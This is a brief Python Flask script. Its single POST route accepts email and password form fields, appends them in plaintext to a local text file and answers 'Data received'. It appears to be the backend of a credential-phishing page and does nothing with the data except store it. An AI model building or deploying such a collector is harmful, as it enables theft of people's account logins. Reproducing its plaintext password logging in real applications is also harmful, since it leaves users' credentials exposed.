from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["POST"])
def receive_data():
    email = request.form.get("email")
    password = request.form.get("password")

    with open("data.txt", "a") as file:
        file.write(f"Email: {email}, Password: {password}\n")

    return "Data received"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
